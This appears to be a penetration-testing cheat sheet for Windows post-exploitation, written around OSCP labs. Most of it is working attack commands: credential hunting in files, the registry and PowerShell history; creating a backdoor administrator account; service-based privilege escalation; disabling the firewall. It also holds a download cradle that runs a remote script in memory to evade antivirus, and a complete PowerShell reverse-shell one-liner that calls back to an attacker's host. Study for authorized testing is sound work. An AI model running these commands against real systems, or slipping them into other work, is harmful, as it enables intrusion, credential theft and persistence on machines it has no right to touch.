
---

## CMD vs PowerShell — Know Which Shell You're In

You'll land in one of two shells. They take different commands, so identify yours first.

|                    | **cmd.exe**     | **PowerShell**                   |
| ------------------ | --------------- | -------------------------------- |
| Prompt looks like  | `C:\Users\bob>` | `PS C:\Users\bob>`               |
| List files         | `dir`           | `dir` / `ls` / `Get-ChildItem`   |
| Read a file        | `type file`     | `type file` / `Get-Content file` |
| Find text in files | `findstr`       | `Select-String`                  |
| Download a file    | `certutil`      | `Invoke-WebRequest` / cradle     |
| Env variable       | `%USERNAME%`    | `$env:USERNAME`                  |

```cmd
powershell
```
→ Launches PowerShell **from inside a cmd shell**. Almost always worth doing after a foothold — PowerShell has richer cmdlets for loot hunting (`Select-String`, `Get-ChildItem -Recurse`) and download cradles that cmd lacks.

```powershell
cmd
```
→ Drops back to cmd from PowerShell if a tool or command only behaves in cmd.

---

## Who Am I

```cmd
whoami
```
→ Confirms **which user** you are. First sanity check after any shell, same as Linux — you need to know the account before you know what it can do.

```cmd
whoami /priv
```
→ Lists the current token's **privileges** and whether each is enabled. This is the single most important Windows privesc check — `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, etc. each map to a known escalation. See [[Windows_Priv_Esc]] for the exploitable-privilege table.

```cmd
whoami /groups
```
→ Shows group memberships (Administrators, Backup Operators, Remote Management Users, Domain Admins). Group membership can be a direct path — e.g. Backup Operators can read the SAM, Remote Management Users can WinRM in.

```cmd
whoami /all
```
→ Everything at once — user SID, groups, and privileges in one dump. Good for saving to a file for later review.

---

## System / OS Info

```cmd
systeminfo
```
→ Full OS build, version, architecture, hotfixes, and domain membership. The **build number + installed hotfixes** are what you match against kernel/local exploits — the Windows equivalent of `uname -a`. Also tells you if the box is domain-joined.

```cmd
hostname
```
→ The machine name. Matters in AD — the hostname is often the computer account name and appears in Kerberos tickets and SMB shares.

```cmd
ver
```
→ Quick Windows version string without the full `systeminfo` dump.

```powershell
[System.Environment]::OSVersion.Version
```
→ PowerShell way to pull the exact OS version object when `systeminfo` is restricted.

---

## Users & Groups

```cmd
net user
```
→ Lists all **local** users. Look for service accounts, admin-named accounts, and anything non-default.

```cmd
net user <username>
```
→ Inspect a specific user — group memberships, last logon, whether the account is active. Check `Local Group Memberships` for `*Administrators`.

```cmd
net localgroup
```
→ Lists local groups on the machine.

```cmd
net localgroup administrators
```
→ Who has local admin rights. Your target list for lateral movement or the account you're trying to become.

```cmd
net user /domain
```
→ Lists **domain** users (only works if the box is domain-joined). `net group /domain` and `net group "Domain Admins" /domain` enumerate domain groups. See [[Active_Directory_Attacks]].

---

## Backdoor Account (Persistence)

```cmd
net user backdoor Password1 /add
```
→ Creates a new local user. Only do this once you already have admin — it's persistence, not escalation.

```cmd
net localgroup administrators backdoor /add
```
→ Grants admin rights to the backdoor user.

```cmd
net user backdoor
```
→ Verify account creation and group membership.

---

## File System Navigation

```cmd
cd \
dir
dir /a
```
→ Basic navigation. `dir /a` includes **hidden and system files** — the Windows equivalent of `ls -la`, and where loot often hides.

```cmd
dir /a /s /b C:\Users
```
→ Recursive (`/s`), bare-format (`/b`) listing including hidden files. Bare format prints full paths only — clean output you can pipe into `findstr`.

```cmd
tree /f
```
→ Visualizes folders + files as a tree. Great for quickly spotting scripts, configs, or oddly-named files in a directory.

---

## Reading Files

```cmd
type filename.txt
```
→ Dumps a file to the screen — the Windows `cat`. Best for small files.

```cmd
more filename.txt
```
→ Paged output for long files (`Space` = next page, `q` = quit).

```powershell
Get-Content filename.txt
```
→ PowerShell read. Add `| Select-String password` to grep inside it, or `-TotalCount 20` to read just the top.

---

## Loot Hunting — Searching for Interesting Files

> **This is where Windows differs most from Linux.** Creds don't live in `~/.bash_history` and `/etc/passwd` — they live in config files, XML answer files, saved-credential stores, the registry, and PowerShell history. Hunt these systematically.

### Keyword search across the filesystem

```cmd
findstr /si password *.txt *.ini *.config *.xml
```
→ `/s` recurse subdirs, `/i` case-insensitive. Searches **inside** files for the word "password". Run it from `C:\` or from a user's profile. This is the everyday cred-hunt one-liner.

```cmd
dir /s /b C:\ | findstr /i "pass cred config unattend .kdbx"
```
→ Searches **filenames** (not contents) for interesting names across the whole drive — password stores (`.kdbx` = KeePass), config files, answer files.

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```
→ PowerShell equivalent — recurse, filter by extension, then search contents. `-ErrorAction SilentlyContinue` is the `2>/dev/null` of PowerShell (suppresses access-denied noise).

### High-value cred file locations (check these directly)

```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\unattend.xml
```
→ **Answer files** from automated installs. Frequently contain a base64-encoded local admin password in plaintext. One of the most reliable Windows finds.

```cmd
type C:\inetpub\wwwroot\web.config
```
→ IIS web app config — database connection strings and credentials in plaintext, same role as `/var/www/html/config.php` on Linux.

```cmd
cmdkey /list
```
→ Lists **saved credentials** in the Windows Credential Manager. If you see stored creds you often can't read the password, but you can *use* it via `runas /savecred` (see below).

```cmd
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\ /s /a
dir C:\Users\*\AppData\Local\Microsoft\Credentials\ /s /a
```
→ DPAPI-protected credential blobs. Note their presence — decrypting them needs the user's masterkey (Mimikatz territory, admin/SeDebug).

### PowerShell history (the Windows `.bash_history`)

```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
→ Every command the user typed in PowerShell, across sessions, saved to disk. Admins paste passwords into commands here constantly. **Always check this.** Per-user path, so check every profile you can read.

### Registry cred stores

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
→ Recursively searches the registry for values containing "password". Noisy but catches app configs and autologon secrets.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
→ **AutoLogon** credentials — `DefaultUserName` / `DefaultPassword` stored in plaintext. See [[winPEAS]] for the gotcha about the username not matching the real sAMAccountName.

> More loot targets and file paths: [[Juicy_Files]] (cross-references the Linux/Windows hunt).

---

## Permissions (icacls)

```cmd
icacls <file_or_dir>
```
→ Shows the access-control list — **who can do what** to a file or folder. The Windows equivalent of checking `ls -la` permissions, and central to service/scheduled-task privesc.

Look for **your user** or a group you're in (`Users`, `Authenticated Users`, `Everyone`) with:

| Right | Meaning |
|---|---|
| `(F)` | Full control — read, write, delete, change perms, take ownership |
| `(M)` | Modify — read, write, execute, delete |
| `(W)` | Write — change the file's contents / overwrite it |
| `(RX)` | Read + execute only — no privesc on its own |

→ A service binary or scheduled-task script that your user can `(F)`, `(M)`, or `(W)` is a privesc path — see [[Windows_Priv_Esc]].

---

## Services

```cmd
sc query
```
→ Lists all services and their state (running/stopped).

```cmd
sc qc <service_name>
```
→ Shows a service's **binary path** (`BINARY_PATH_NAME`) and the account it runs as (`SERVICE_START_NAME`). A service running as `LocalSystem` with a binary you can write to = SYSTEM.

```cmd
icacls "C:\Path\to\service.exe"
```
→ Check whether the service binary is writable by you (see Permissions above).

```cmd
sc stop <service>
sc start <service>
```
→ Restart the service to trigger your replaced payload — but only if your account is allowed to control it. See [[Windows_Priv_Esc]] for the full service-abuse chain (writable binary, unquoted paths, weak DACLs).

---

## Scheduled Tasks

```cmd
schtasks /query
```
→ Lists scheduled tasks.

```cmd
schtasks /query /fo LIST /v
```
→ **Verbose** list — shows the run-as user, trigger, and the exact command/script each task runs. Look for a task running as SYSTEM that calls a script you can write to.

```cmd
schtasks /query /tn "<TaskName>" /fo LIST /v
```
→ Inspect one specific task in detail.

---

## Network Info

```cmd
ipconfig /all
```
→ All adapters, IPs, DNS servers, and **domain suffix**. The DNS server in a domain is usually the Domain Controller — note its IP. Identifies extra subnets for pivoting.

```cmd
netstat -ano
```
→ All listening ports and connections with the owning **PID**. Look for services bound to `127.0.0.1` that weren't in your external nmap — hidden internal services, same idea as `ss -tlnp` on Linux.

```cmd
tasklist | findstr <PID>
```
→ Map a PID from `netstat` back to a process name. A PID is the unique number Windows assigns each running program — use it to learn which process owns a listening port.

```cmd
arp -a
route print
```
→ ARP cache and routing table — reveals other live hosts and reachable subnets for pivoting.

---

## File Transfer (Quick)

```cmd
certutil -urlcache -f http://<KALI_IP>/file.exe file.exe
```
→ Download over HTTP using a built-in Windows binary (does **not** execute the file). The reliable Windows `wget`.

```powershell
Invoke-WebRequest http://<KALI_IP>/file.exe -OutFile file.exe
iwr http://<KALI_IP>/file.exe -o file.exe
```
→ PowerShell download. `iwr` is the short alias.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/script.ps1')
```
→ **Download cradle** — pulls a script and runs it in memory, never touching disk (evades some AV). The Windows equivalent of `curl ... | bash`.

```cmd
\\<KALI_IP>\share\file.exe
```
→ Run a file straight off an SMB share you host on Kali (`impacket-smbserver`). See [[File_Transfer]] and [[UNC_Execution]] for the full transfer playbook.

---

## PowerShell Essentials

```powershell
Get-ChildItem -Recurse -Force
```
→ Recursive listing including hidden/system items (`-Force` = show hidden). The `ls -laR` of PowerShell.

```powershell
Select-String -Path C:\Users\*\*.txt -Pattern "password"
```
→ Grep inside files — the PowerShell `grep`/`findstr`. Combine with `Get-ChildItem` for recursive searches.

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
```
→ Cmdlet versions of `net user` / `net localgroup` — cleaner, scriptable output.

---

## Getting a Better Shell

Windows shells don't need TTY stabilization like Linux reverse shells, but a raw `nc` shell is still clunky. Two upgrades:

```cmd
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<KALI_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```
→ A PowerShell reverse shell — cleaner than a raw cmd shell. Start `nc -lvnp <PORT>` on Kali first.

→ For a fully interactive session, prefer **evil-winrm** (if 5985/5986 is open) or **RDP** once you have creds — both give a proper terminal. See [[RDP_and_WinRM]].

---

## Flag Locations (OSCP)

```cmd
type C:\Users\<user>\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```
→ OffSec exam/lab flags. `local.txt` sits on the low-priv user's Desktop; `proof.txt` on the Administrator's Desktop (needs SYSTEM/admin). PG Practice may use `local.txt` / `proof.txt` or `user.txt` / `root.txt` depending on the platform.

```cmd
where /r C:\Users local.txt proof.txt
```
→ Search all profiles for the flag files at once if you're not sure which Desktop.

---

## RDP & Sessions

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"
```
→ Check whether RDP is enabled (`fDenyTSConnections` = 0 means enabled).

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
→ Enable RDP (admin only) — useful once you have creds and want an interactive desktop.

```cmd
netsh advfirewall set all profiles state off
```
→ Disable the firewall (admin only) to let RDP/tools through. Noisy — only when you already own the box.

---

## Quick Credential Testing

```cmd
runas /user:DOMAIN\user cmd.exe
```
→ Spawn a shell as another user with a known password — the Windows `su`. Prompts for the password.

```cmd
runas /savecred /user:Administrator cmd.exe
```
→ Uses a credential already saved in Credential Manager (from `cmdkey /list`) without knowing the plaintext.

```bash
xfreerdp /v:<IP> /u:user /p:password
```
→ From Kali — test RDP creds. `netexec smb <IP> -u user -p password` tests SMB creds across a host or subnet (see [[NetExec]]).

---

## Related Notes

- [[Windows_Priv_Esc]]
- [[winPEAS]]
- [[File_Transfer]]
- [[UNC_Execution]]
- [[Active_Directory_Attacks]]
- [[Linux_Common_Commands]]
